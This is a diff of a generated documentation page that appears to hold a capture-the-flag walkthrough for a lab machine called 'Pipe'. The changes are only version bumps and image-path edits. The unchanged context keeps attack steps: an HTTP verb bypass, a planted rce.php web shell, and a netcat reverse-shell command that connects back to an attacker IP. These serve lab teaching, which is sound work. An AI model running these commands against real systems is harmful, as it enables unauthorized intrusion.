@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.2.0.746752640139">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.748397239147">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.2.0">
+    <meta name="generator" content="Retype 3.5.0">
 
     <!-- Primary Meta Tags -->
     <title>Pipe</title>
@@ -30,12 +30,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../resources/css/retype.css?v=3.2.0.746752640139" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.5.0.748397239147" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.2.0.746752640139" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.2.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.2.0.746752640139" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.2.0.746752640139" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.748397239147" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.748397239147" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.5.0.748397239147" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -197,7 +197,6 @@
                             <div class="docs-markdown" id="docs-content">
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
-                
                                 <!-- Page content  -->
 <doc-anchor-target id="pipe" class="break-words">
     <h1>
@@ -246,42 +245,42 @@
 Changing the request to POST or even something that does not exist like &quot;GETS&quot;, we can bypass and get the <code v-pre>index.php</code> page.</p>
 <p>Looking at the source-code we find an interesting JS file:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled.png" alt="">
+    <img src="untitled.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Accessing <a href="http://192.168.26.130/scriptz/">http://192.168.26.130/scriptz/</a> we can find more files.</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled1.png" alt="">
+    <img src="untitled1.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>The file <code v-pre>log.php.BAK</code> file seems to be a logger:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled2.png" alt="">
+    <img src="untitled2.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Looking back to the <code v-pre>index.php</code> source-code we can see the parameters that are submitted in the form:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled3.png" alt="">
+    <img src="untitled3.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We now intercept the request for “Show Artist Info” in burp:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled4.png" alt="">
+    <img src="untitled4.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p><figure class="content-center">
-    <img src="pipe/untitled5.png" alt="">
+    <img src="untitled5.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Decoding the <code v-pre>param</code> value:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled6.png" alt="">
+    <img src="untitled6.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -298,7 +297,7 @@ Changing the request to POST or even something that does not exist like &quot;GE
 </doc-codeblock></div>
 <p>It works! Our <code v-pre>rce.php</code> file is there.</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled7.png" alt="">
+    <img src="untitled7.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -310,7 +309,7 @@ Changing the request to POST or even something that does not exist like &quot;GE
 </doc-anchor-target>
 <p>The remote command execution can be triggered via <a href="http://192.168.26.130/scriptz/rce.php?cmd=id">http://192.168.26.130/scriptz/rce.php?cmd=id</a></p>
 <p><figure class="content-center">
-    <img src="pipe/untitled8.png" alt="">
+    <img src="untitled8.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -325,7 +324,7 @@ Changing the request to POST or even something that does not exist like &quot;GE
 <pre class="language-none"><code v-pre class="language-none">http://192.168.26.130/scriptz/rce.php?cmd=nc 192.168.26.128 4444 -e /bin/bash</code></pre>
 </doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="pipe/untitled9.png" alt="">
+    <img src="untitled9.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -395,6 +394,6 @@ Changing the request to POST or even something that does not exist like &quot;GE
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Pipe", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Pipe", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
